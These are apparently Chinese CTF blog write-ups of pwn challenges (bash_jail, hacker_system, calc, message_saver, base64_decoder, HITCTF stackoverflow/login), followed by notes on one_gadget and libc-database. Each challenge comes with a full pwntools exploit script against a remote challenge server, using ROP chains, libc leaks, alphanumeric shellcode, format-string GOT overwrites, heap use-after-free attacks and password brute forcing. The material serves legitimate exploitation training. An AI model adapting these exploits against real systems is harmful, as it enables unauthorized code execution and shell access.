perror(&quot;execve&quot;); /* execve() only returns on error */ exit(EXIT_FAILURE);&#125; 因此可以发现在题目中执行system(lineptr)时，如果lineptr=’$0’的话，实际上执行的是execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=’\$0’ 而\$0就是’/bin/sh’，进一步就获得了shell。 题解的exp脚本如下： 123456789101112131415#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./bash_jail') context.log_level = 'debug' #gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10006)p.recvuntil('&gt;')p.sendline('$0')p.interactive() hacker_system_v1程序功能较多，但留下的漏洞很明显， 用户可以自定义输入长度，但是用于存储的空间是一定的，因此存在栈溢出漏洞，并且没有开启canary保护。 通常的栈溢出需要泄露libc地址，因此构造的rop分成两段，首先打印出puts@got泄露出libc地址，再read另一段rop到bss段中可以写的位置，最终将栈迁移过去。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding:utf-8from pwn import *import timedebug=0elf = ELF('./hacker_system_ver1')if debug: p= process('./hacker_system_ver1') context.log_level = 'debug' libc = ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(p,'b *0x8048B1B')else: p = remote('111.230.149.72 ', 10005) libc = ELF('./libc32.so')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline('200')p.recvuntil('name:')padding = 'a'*0x34pr = 0x08048455pppr = 0x08048d49rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)p.sendline(rop)p.recvuntil('find!!\n')puts_addr = u32(p.recv(4))print '[+]puts address:',hex(puts_addr)libc.address = puts_addr-libc.symbols['puts']print '[+]system address:',hex(libc.symbols['system'])rop = p32(0x804bc00)+ p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(next(libc.search('/bin/sh')))p.send(rop)p.interactive()'''============================================================0x08048d4b : pop ebp ; ret0x08048d48 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048455 : pop ebx ; ret0x08048d4a : pop edi ; pop ebp ; ret0x08048d49 : pop esi ; pop edi ; pop ebp ; ret0x0804843e : ret0x080487f0 : ret 0x458b0x0804819c : ret 0x86940x080485ce : ret 0xeac1''' ez_shellcode_ver2这个是ez_shellcode的升级版本，对shellcode长度没有限制，仅限制shellcode是a~zA~Z0~9范围内，这样的shellcode叫alpha shellcode，利用msfencode可以生成，但大多数时候都直接使用可以百度到的orz http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int 80这样的指令。 解题的exp脚本如下： 1234567891011121314151617181920#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./ez_shellcode_ver2') context.log_level = 'debug' #gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10007)p.recvuntil('&gt;')shellcode = '''PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'''#a = shellcraft.sh()#print len(asm(shellcode))p.sendline((shellcode))p.interactive() LEVEL - WEEK 3hacker_system_ver2这是第二周题目的升级版，除了编译环境从x86转换到了x64没任何差别，包括漏洞。 因此利用同样的解题思路进行rop构造，仅是gadget的使用方法不同罢了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *import timedebug=0elf = ELF('./hacker_system_ver2')if debug: p= process('./hacker_system_ver2') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400d74')else: p = remote('111.230.149.72 ', 10008) libc = ELF('./libc64.so')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline('200')p.recvuntil('name:')padding = 'a'*0x30#pr = 0x08048455#pppr = 0x08048d49rdi_ret = 0x0000000000400fb3rsi_ret = 0x0000000000400fb1rbp_ret = 0x0000000000400800rop = padding + p64(0x602e00) + p64(rdi_ret) +p64(elf.got['puts']) + p64(elf.symbols['puts']) + p64(rsi_ret) + p64(0x602e00) + p64(0x602e00) + p64(rdi_ret) + p64(0) + p64(elf.symbols['read']) + p64(rbp_ret) + p64(0x602e00) + p64(0x400D74)#rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)p.sendline(rop)p.recvuntil('find!!\n')puts_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]puts address:',hex(puts_addr)libc.address = puts_addr-libc.symbols['puts']print '[+]system address:',hex(libc.symbols['system'])rop = p64(0x602c00)+ p64(rdi_ret) +p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])p.send(rop)p.interactive()'''Gadgets information============================================================0x0000000000400fac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400fae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400fb0 : pop r14 ; pop r15 ; ret0x0000000000400fb2 : pop r15 ; ret0x0000000000400fab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400faf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400800 : pop rbp ; ret0x0000000000400fb3 : pop rdi ; ret0x0000000000400fb1 : pop rsi ; pop r15 ; ret0x0000000000400fad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006a9 : ret0x0000000000400a29 : ret 0x8b48Unique gadgets found: 12''' calc题目中实现了一个简单的计算器。题目采用静态编译的方法，编译了需要的所有函数。 漏洞在于每次存储结果时，计数器会往后移4个字节，但是对于存储结果个数没有限制，导致栈溢出。 利用ROPgadget的ropchain功能，对于静态编译的程序，很容易可以生成一个rop链，将rop链覆盖在返回地址处即可。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from struct import packfrom pwn import *import timedebug=0if debug: p= process('./calc') #context.log_level = 'debug'else: p= remote('111.230.149.72 ', 10009)def get_rop_string(): rop = '' rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea060) # @ .data rop += pack('&lt;I', 0x080b8446) # pop eax ; ret rop += '/bin' rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea064) # @ .data + 4 rop += pack('&lt;I', 0x080b8446) # pop eax ; ret rop += '//sh' rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08049603) # xor eax, eax ; ret rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x080481c9) # pop ebx ; ret rop += pack('&lt;I', 0x080ea060) # @ .data rop += pack('&lt;I', 0x080dee5d) # pop ecx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08049603) # xor eax, eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0806d445) # int 0x80 return ropdef add_save(num): p.recvuntil('&gt;') p.sendline('1') p.recvuntil('a:') p.sendline(str(num)) p.recvuntil('b:') p.sendline('0') p.recvuntil('&gt;&gt;&gt;') p.recvuntil('&gt;') p.sendline('5') p.recvuntil('success!!')def padding(): for i in range(0,64): add_save(0xbadbad) print '[+] round',str(i) add_save(68)def rop_input(rop_string): for i in range(len(rop_string)/4): print hex(u32(rop_string[4*i:4*(i+1)])) add_save(u32(rop_string[4*i:4*(i+1)]))padding()#gdb.attach(p,'b *0x8048AC0')rop='\xd3j\x05\x08`\xa0\x0e\x08F\x84\x0b\x08/bin\xfbQ\x05\x08\xd3j\x05\x08d\xa0\x0e\x08F\x84\x0b\x08//sh\xfbQ\x05\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\xfbQ\x05\x08\xc9\x81\x04\x08`\xa0\x0e\x08]\xee\r\x08h\xa0\x0e\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08E\xd4\x06\x08'#print '[*] flag',flagrop_input(rop)p.recvuntil('&gt;')p.sendline('6')p.recvuntil('bye.')p.sendline('cat flag')p.interactive() zazahui_ver2和上一版本的zazahui有所不同，这次利用的是strcmp的比较。 同样存在s的溢出覆盖，不过此次不能简单的使用溢出来打印flag了，但是strcmp仍然可以利用，就是爆破。 逆向爆破flag的地址，可以大大缩短爆破次数。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./zazahui_ver2') #context.log_level = 'debug' gdb.attach(p,'b *0x80487AB')else: p = remote('111.230.149.72 ', 10010)dic = range(33,127)dic.append(0)#qdic.reverse()p.recvuntil('&gt;')start = 0x804A084end = 0x804A060flag=''i = start while i&gt;=end: pro = log.progress('go') for j in dic: pro.status('boom for '+hex(i)) bomb = (chr(j)+flag)+'\0'*(0xb0-len((chr(j)+flag)))+p32(i) p.send(bomb) if 'too' in p.recvuntil('&gt;'): flag = chr(j) + flag pro.success(hex(i)+': '+hex(j)+' '+chr(j)) i = i-1#a= 'a'*0xb0+p32(0x804A060)+p32(0x99)#p.recv()print '[*] flag',flagp.interactive() message_saver程序实现了一个可以加解密存储的记事本，逻辑简单 只维护了一个变量作为message的存储结构，结构如下 123+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| length | address | function ptr | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 其生成方法在add函数中： 在edit函数中可以重新编辑信息，在编辑过程中会重新申请一个内存块，但原来的并不会释放（内存泄露），最终会执行function（address）函数，主要如果可以控制内存块的内容，就完全可以控制执行逻辑。 在delete函数中会free掉这个内存块，但并未置空结构体，存在一个悬垂指针。 并且，在全部的函数中都没有检测都没有检测是否已经删除了结构块，导致一个UAF漏洞、double free漏洞。 利用UAF漏洞可以很容易的控制程序执行流程： 先申请一个非0x18的块，delete之后，在edit一个0x18的块，就可以劫持结构体内容了。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import timedebug=0elf = ELF('./message_saver')if debug: p= process('./message_saver') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400C64')else: p = remote('111.230.149.72 ', 10011) libc = ELF('./libc64.so')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('length:')p.sendline(str(0x100))p.sendline('p4nda')p.recvuntil('===')p.sendline('2')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline(str(0x18))p.recvuntil('message:')p.sendline(p64(0x00)+p64(elf.got['puts'])+p64(0x40084D))p.recvuntil('&gt;')p.sendline('3')p.sendline('\0\0\0'+p64(0x00)+p64(elf.got['puts'])+p64(elf.symbols['puts']))p.recvuntil('&gt;')p.sendline('3')tmp = p.recvuntil('\n==')addr = tmp[-9:-3]puts_addr = u64(addr.ljust(8,'\0'))print '[+]puts addr : ',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+]system addr :',hex(libc.symbols['system'])p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline(str(0x18))p.recvuntil('message:')p.sendline('/bin/sh\0'+p64(elf.got['puts'])+p64(libc.symbols['system']))p.interactive() LEVEL - WEEK 4ascii_art_market题目是一个简单的ASCII码艺术字生成器，但对题目没有什么影响，关键点在于main函数中存在一个0x10比特的栈溢出，导致可以覆盖rbp和返回地址。但这远不够获得shell。 最初的想法是先把rbp迁移到一个可写的地方，然后慢慢调试返回地址到哪里去，一个直接的想法是继续输入，争取更大的rop链，因此先把返回地址写到0x4009fc，这个位置可以继续输入，调试时发现，这样覆盖会把输入内容写到bss-0x80的位置去。这样再把栈迁移到bss-0x80就可以执行输入的rop了，第二次再覆盖时，利用leave ret将栈迁移到bss段上，就可以执行任意的rop了，使用的rop和hacker_system中的相同。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import timedebug=0elf = ELF('./ascii_art_maker')if debug: p= process('./ascii_art_maker') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x0400A2B')else: p = remote('111.230.149.72 ', 10012) libc = ELF('./libc64.so')target = 0x4009FCp.recvuntil('convert:')p.send('a'*0x80+p64(0x602c00)+p64(target))rdi_ret = 0x0000000000400a93rsi_ret = 0x0000000000400a91rbp_ret = 0x0000000000400640rop =p64(0xbadbad)+ p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.symbols['puts'])+ p64(rsi_ret) + p64(0x602e00) + p64(0x602e00) + p64(rdi_ret) + p64(0) + p64(elf.symbols['read']) + p64(rbp_ret) + p64(0x602e00) + p64(0x400A2B)rop = rop.ljust(0x80,'a')+p64(0x602c00-0x80)+p64(0x400A2B)#p.send(p64())p.send(rop)addr_leak = p.recvuntil('\x7f')[-6:]puts_addr = u64(addr_leak.ljust(8,'\0'))print '[+] puts : ',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+] system: ',hex(libc.symbols['system'])rop = p64(0x602c00)+ p64(rdi_ret) +p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])p.send(rop)p.interactive()'''============================================================0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a90 : pop r14 ; pop r15 ; ret0x0000000000400a92 : pop r15 ; ret0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400640 : pop rbp ; ret0x00000000004009dd : pop rbx ; pop rbp ; ret0x0000000000400a93 : pop rdi ; ret0x0000000000400a91 : pop rsi ; pop r15 ; ret0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : ret0x0000000000400980 : ret 0x458b''' base64_decoder题目是一个base64解码器，将用户输入的字符串经过base64解码，然后打印出来。 存在一个明显的格式化字符串漏洞，并且字符串漏洞在栈上，可以对内存地址任意写。 起初以为很简单，直接使用了之前给的libc文件，却发现怎么搞也搞不通，猜测是libc被替换了，学习使用了libc database，找到了题目使用的libc——libc6-i386_2.19-0ubuntu6.14_amd64.so。 可以参考置顶日志的libc database使用方法 最终利用system替换strcmp执行system(‘/bin/sh’)，解题脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8'''%7$p offset'''from pwn import *import time,base64debug=0elf = ELF('./base64_decoder')if debug: p= process('./base64_decoder') context.log_level = 'debug' libc=ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(p,'b *0x8048945')else: p = remote('111.230.149.72',10013)#process('./pwn1') libc = ELF('./libc6-i386_2.19-0ubuntu6.14_amd64.so')#base64.b64encode(s, altchars=None) p.recvuntil('&gt;')p.sendline(base64.b64encode('%2$p'))heap_addr = p.recvline()print '[*] heap addr:',heap_addrheap_addr_int = int(heap_addr[3:-1],16)print '[*] heap addr:',hex(heap_addr_int)p.recvuntil('&gt;')fmt = p32(heap_addr_int-0x110)+"%%%dc%%%d$hhn"%(200,7)p.sendline(base64.b64encode(fmt))p.recvuntil('&gt;')fmt = p32(elf.got['printf'])+"%7$s"p.sendline(base64.b64encode(fmt))p.recvuntil('\x08')printf_addr = u32(p.recv(4))print '[*] printf addr:',hex(printf_addr)p.recvuntil('&gt;')fmt = p32(elf.got['puts'])+"%7$s"p.sendline(base64.b64encode(fmt))p.recvuntil('\x08')puts_addr = u32(p.recv(4))print '[*] puts addr:',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[*] system addr:',hex(libc.symbols['system'])target = libc.symbols['system'] #print '[+] strcmp@got: ',hex(elf.got['strcmp'])p.recvuntil('&gt;')fmt = fmtstr_payload(7, &#123;elf.got['strcmp']: target&#125;, write_size='byte')p.sendline(base64.b64encode(fmt))p.recvuntil('&gt;')p.interactive() hacker_system_ver3函数维护了一个bss段上的结构体数组，其每一个结构体的大小是0x38， 123456789100x00 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | length | name 1 | 0x10 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | name 2 | name 3 | 0x20 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | name 4 | age | 0x30 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | intr addr | 0x38 +-+-+-+-+-+-+- 其漏洞在于删除函数中，利用name寻址，将intr address释放后，再释放该结构体，最终将数组的该位置置空。 但问题在于，当出现name相同的结构体时，仅置空了最后一个数组的指针，造成之前的指针均为悬垂指针，进而造成double free漏洞。 该double free漏洞可以控制任意大小的fastbin，原因是，在add 功能时，可以add任意大小的内存块。 这里采用了bluecake@dubhe大佬的fastbin利用方法。 劫持两个fastbin的链来构造新的fake bin块。最终覆写top地址，将top地址覆写为不存在canary保护的函数栈上，再申请堆块是，会把栈地址分配给用户，进一步可以写rop，劫持控制流，拿到shell。 解题的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from pwn import *#import time,base64debug=0elf = ELF('./hacker_system_ver3')if debug: p= process('./hacker_system_ver3') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p)#,'b*0x0400F6D'else: p = remote('111.230.149.72',10014)#process('./pwn1') libc = ELF('./libc64.so')def add(name,age,length,intro): p.recvuntil('&gt;') p.sendline('1') p.recvuntil('name:') p.send(name) p.recvuntil('age:') p.sendline(str(age)) p.recvuntil('length:') p.sendline(str(length)) p.recvuntil('intro:') p.sendline(intro)def print_user(name): p.recvuntil('&gt;') p.sendline('2') p.recvuntil('name:') p.sendline(name)def delete_user(name): p.recvuntil('&gt;') p.sendline('3') p.recvuntil('name:') p.sendline(name)#step 1 leak libcadd('step1\n',0,0x20,'hack by p4nda')add('step1\n',0,0x20,'hack by p4nda')delete_user('step1')add('nop1\n',0,0x38,p64(0x18)+'1'.ljust(0x20,'\0')+p64(3)+p64(elf.got['puts']))print_user('1')p.recvuntil('intro:')puts_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]puts addr :',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+]system addr :',hex(libc.symbols['system'])#step 2 leak steakadd('step2\n',0,0x20,'hack by p4nda')add('step2\n',0,0x20,'hack by p4nda')delete_user('step2')add('nop2\n',0,0x38,p64(0x18)+'2'.ljust(0x20,'\0')+p64(3)+p64(libc.symbols['environ']))print_user('2')p.recvuntil('intro:')stack_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]stack addr :',hex(stack_addr)stack_offset =0x7ffd3af20438-0x7ffd3af20330#add('padding\n',18,0x138,'hack by p4nda')#delete_user('nop2')#delete_user('2')#delete_user()'''add('padding_3\n',18,0x20,'hack by p4nda')add('step3\n',18,0x20,'hack by p4nda')add('step3\n',18,0x20,'hack by p4nda')delete_user('step3')add('nop3\n',18,0x38,p64(0x18)+'3'.ljust(0x20,'\0')+p64(3)+p64(0))delete_user('nop3')delete_user('3')delete_user('padding_3')add('ctrl3\n',18,0x38,p64(0xdeadbeef))'''add('step3\n',0,0x70,'hack by p4nda')add('step3\n',0,0x70,'hack by p4nda')delete_user('step3')delete_user('step3')print '[+]stack addr :',hex(stack_addr)#gdb.attach(p,'b *0x400a0f')add('step3\n',0,0x70,p64(0x61))add('step3\n',0,0x70,'hack by p4nda')add('step3\n',18,0x70,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')delete_user('step4')delete_user('step4')#gdb.attach(p,'b *0x400a0f')add('step4\n',0,0x50,p64(libc.symbols['__malloc_hook']+0x10+0x08*6))add('step4\n',0,0x50,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')delete_user('padding')add('step4\n',0,0x50,p64(0)*3+p64(stack_addr-stack_offset-0x8))add('step4\n',0,0x40,p64(0x0000000000401053)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))#add('step3\n',18,0x60,'a'*0x40)p.interactive()'''============================================================0x000000000040104c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040104e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401050 : pop r14 ; pop r15 ; ret0x0000000000401052 : pop r15 ; ret0x000000000040104b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040104f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400870 : pop rbp ; ret0x0000000000401053 : pop rdi ; ret0x0000000000401051 : pop rsi ; pop r15 ; ret0x000000000040104d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400709 : ret0x0000000000400782 : ret 0x20180x0000000000400abd : ret 0x8b48''' 题目]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[问题解决及工具使用]]></title>
    <url>%2F2018%2F03%2F03%2Fquestion%2F</url>
    <content type="text"><![CDATA[记录一些工具的使用方法和遇到的问题解决途径 工具使用one_gadgetgithub : https://github.com/david942j/one_gadget 所谓 one_gadget 就是一个实现了直接执行system(‘/bin/sh’)的程序跳板。 常见的，可以使用one_gadget覆盖劫持got表、返回地址、hook（__malloc_hook、__free_hook）等等操作，也就是当可以劫持控制流后覆盖的捷径 安装方法安装one_gadget需要ruby环境，因为是由ruby写成的。 以ubuntu为例，首先安装ruby 1sudo apt-get install ruby 还需要安装ruby的包管理器 1sudo apt-get install gem 依赖安装好了以后就可以安装one_gadget了 1$ gem install one_gadget 使用方法一般针对libc使用，直接one_gadget libc.so就可以了 输出结果： 12345678910111213141516└─[$] &lt;&gt; one_gadget libc64.so 0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 当泄露了libc基地址以后再用libc base+offset就可以使用了，但需要注意one_gadget的输出是有一定限制的，如[$rax = NULL]，需要逐个尝试。 libc databasegithub: https://github.com/niklasb/libc-database 有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。 安装方法先下载libc database 1git clone https://github.com/niklasb/libc-database 利用get来下载流行的libc库 12cd libc-database./get 程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下 使用方法使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260 puts 0xf7xxxf30，输入最后三位即可 12$ ./find printf 260 puts f30archive-glibc (id libc6_2.19-10ubuntu2_i386) 问题解决ida “sp-analysis failed” 错误问题描述具体情况是在分析QWB CTF 2018 比赛中raisepig一题中，发现某些函数在按F5进行反编译时，出现这个问题，导致无法查看反编译代码。 参考了本队大佬的博客以后，解决了问题。 解决方法问题原因貌似是在代码执行中的pop、push操作不匹配，导致ida解析的时候对esp的值产生错误造成的。这种不匹配可能对程序执行并无影响。 一种可能的解决办法是： 首先，在ida中打开栈指针的显示：options-general-stack pointer (勾选) 结果会在原来的地址偏移的旁边，显示函数栈内ESP寄存器的偏移： 可以看到在出现问题的函数中，retn前的偏移是一个非0值，这回导致ida识别函数出错，修改的目的就是使这个值为0，修改办法是使用“ALT + K”快捷键，强行使esp保持平衡，具体操作是： 在leave这一行（这很重要）按快捷键“ALT+K”，修改其值为leave前方标志的其ESP偏移值： 当发现，retn前标志的ESP偏移是00时，按F5应该就可以反编译了（不要care红色的报错，果断的按F5！） gem “ERROR: Failed to build gem native extension.”问题问题描述在安装seccomp-tools时，使用 1gem install seccomp-tools 命令时，出现报错 1234567 ERROR: Error installing seccomp-tools: ERROR: Failed to build gem native extension. /System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/bin/ruby extconf.rb mkmf.rb can&apos;t find header files for ruby at /System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/lib/ruby/ruby.h 解决方法缺少ruby-dev，执行 1sudo apt-get install ruby-dev]]></content>
      <tags>
        <tag>Questions</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCTF 2018 PWN 题记录]]></title>
    <url>%2F2018%2F02%2F05%2Fhitctf%2F</url>
    <content type="text"><![CDATA[HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。 本次比赛共有五道PWN题： stackoverflow （栈溢出） login（爆破） DragonBall（整数溢出） nodes（溢出BSS段，影响程序逻辑） babynote（UAF） stackoverflow此题目是PWN题的签到题，函数逻辑简单，在主函数调用的vuln函数中存在明显的栈溢出漏洞 可以溢出覆盖0x18个字节，并且没有开启canary保护， 可以利用ROP技术控制执行流 如程序中存在一个flag函数，可以直接获取flag exp.py脚本如下 123456789101112131415from pwn import *debug =0elf = ELF('./stackoverflow')if debug: p = process('./stackoverflow') context.log_level = 'debug'else: p = remote('111.230.132.82',40000) context.log_level = 'debug'p.recvuntil('Welcome to pwn world!\nLeave your name:')p.send('a'*0x28+p32(0xdeadbeef)+p32(0x80485df)+p32(0xdeadbeef)+p32(0xdeadbeef)+p32(0xc0ffee))p.interactive() login此题的整体代码逻辑很清晰，首先登录一次，然后再过一次check，就可以直接得到flag 对比两个用户名密码的check函数可以发现其中的不同： 很明显发现其不同点在于strncmp的参数上，第一个函数参数长度是用户输入的长度，第二次是固定的长度。此时可以发现两个hint。 password的长度是0x20（抖机灵） 由于password是固定的，因此可以通过爆破的方法来验证，每次爆破一位不断叠加，即可得到其真实密码。 爆破的脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *'''10_adhUNwj_qidACn_qdXon912_uhdq6'''debug = 0if debug: p = process('./login') #libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p)else: p = remote('111.230.132.82', 40001) #context.log_level = 'debug' #libc = ELF('./libc_32.so.6')password = ''dic = range(33,127)def login(j): global password print 'password' + chr(j) if debug: p = process('./login') context.log_level = 'debug' else: p = remote('111.230.132.82', 40001) #context.log_level = 'debug' p.recvuntil('Username:') p.sendline('root') p.recvuntil('Password: ') p.sendline(password+chr(j)) a = p.recvline() print a if 'successful' in a: p.close() return chr(j) else: p.close() return '00'def boom(): global password for i in range(0,0x20): pro = log.progress('go') for j in dic: pro.status('boom for '+chr(j)) #tmp = '' tmp = login(j) #print tmp if tmp!='00': password = password + tmp pro.success(': is '+password) print 'password is ',password breakpassword = ''boom()p.interactive() DragonBall程序大意是 手中共有15个金币， 购买一个龙珠需要5金币，出售一个龙珠3金币，当集齐7颗龙珠以后就能实现愿望了（wish()）。 漏洞利用wish()函数中有明显的溢出漏洞，但是很不充分，溢出仅能覆盖返回地址和EBP，如果单纯写rop很难，除非有很好的跳板，但是并没有发现jmp xxx的跳板，一度陷入僵局… 突然想起查了一下保护开启情况，发现没有开NX保护，也就是说可以执行shellcode… 就是说可以在第一块内写入execve(‘/bin/sh’)的shellcode，然后覆盖返回地址去执行，仅需知道该处的地址即可，需要泄露栈地址，此处可以从第一处写入部分去泄露，泄露wish()的ebp地址，即可得到shellcode起始位置的地址了。 整数溢出漏洞在于buy()中，仅检测是否money!=0的情况，也就是说构造一个money不为5的倍数即可无限制购买，很显然可以先买一个再卖出，就剩余13个金币，无论如何都不可能为0，因此可以无限制购买龙珠，最后达成愿望。 最终，利用脚本如下： 1234567891011121314151617181920212223242526272829303132333435from pwn import *debug = 0elf = 